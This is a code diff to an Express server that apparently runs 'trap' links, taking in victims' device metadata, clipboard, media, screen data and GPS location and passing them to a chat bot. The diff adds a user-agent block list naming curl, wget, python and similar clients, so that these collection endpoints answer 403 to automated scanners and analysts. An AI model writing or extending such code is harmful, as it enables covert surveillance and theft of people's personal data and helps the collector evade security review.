@@ -49,6 +49,14 @@ async function startServer() {
     return Buffer.from(`${chatId}-OSINT-${crypto.randomUUID().slice(0,4)}`).toString('base64url');
   };
 
+  const suspeciousAgents = ['amphp', 'python', 'go-http-client', 'curl', 'wget'];
+
+  const isSuspeciousAgent = (userAgent: string | undefined): boolean => {
+    if (!userAgent) return true; // Block empty user agent
+    const ua = userAgent.toLowerCase();
+    return suspeciousAgents.some(agent => ua.includes(agent));
+  };
+
   const getChatIdFromTrapId = (trapId: string): number | null => {
     try {
       const decoded = Buffer.from(trapId, 'base64url').toString('utf-8');
@@ -390,6 +398,7 @@ async function startServer() {
 
   // Handle Device Metadata Upload
   app.post('/api/log/:id/info', (req, res) => {
+    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
@@ -452,6 +461,7 @@ async function startServer() {
 
   // Handle Extra Data (Clipboard, Media, Screen, etc)
   app.post('/api/log/:id/extra', (req, res) => {
+    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
@@ -708,6 +718,7 @@ async function startServer() {
     res.sendStatus(200);
   });
   app.post('/api/log/:id/gps', (req, res) => {
+    if (isSuspeciousAgent(req.headers['user-agent'])) return res.sendStatus(403);
     const id = req.params.id;
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
